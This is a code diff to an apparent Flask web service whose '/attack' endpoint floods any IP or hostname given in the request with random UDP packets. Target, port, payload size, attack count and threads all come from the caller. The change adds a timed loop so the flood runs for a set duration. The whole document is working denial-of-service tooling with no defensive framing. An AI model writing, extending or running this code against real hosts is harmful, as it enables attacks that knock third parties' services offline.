@@ -3,9 +3,11 @@ import socket
 import random
 import os
 import re
+import time as t
 
 app = Flask(__name__)
-
+start_time = t.time()
+    
 @app.route('/attack', methods=['POST'])
 def start_attack():
     data = request.get_json()
@@ -13,7 +15,7 @@ def start_attack():
     num_attacks = data.get('attack_num', 100000)
     target_ip = data.get('ip', "0.0.0.0")
     target_port = data.get('port', 80)
-
+    duration = int(data.get("time", 10))
 # Function to check if a string is a valid IP address
     def is_valid_ip(ip):
         parts = ip.split('.')
@@ -29,7 +31,7 @@ def start_attack():
     # Remove protocol prefix if present
         target_url = re.sub(r'^(http|https|ftp|udp)://', '', target_ip)
         target_ip = socket.gethostbyname(target_url)
-    
+            
     #data = request.get_json()
     #num_bytes = data.get('payload', 1024)
     #num_attacks = data.get('attack_num', 100000)
@@ -48,10 +50,10 @@ def start_attack():
         if remaining_bytes > 0:
             s.sendto(random._urandom(remaining_bytes), (target_ip, int(target_port)))
         s.close()
-        
-    for _ in range(int(data.get('threads', 10))):
-        for _ in range(int(num_attacks)):
-            attack()
+    while t.time() - start_time < duration:
+        for _ in range(int(data.get('threads', 10))):
+            for _ in range(int(num_attacks)):
+                attack()
 
     return jsonify({'success': True, 'message': 'Attack finished successfully.'})
 
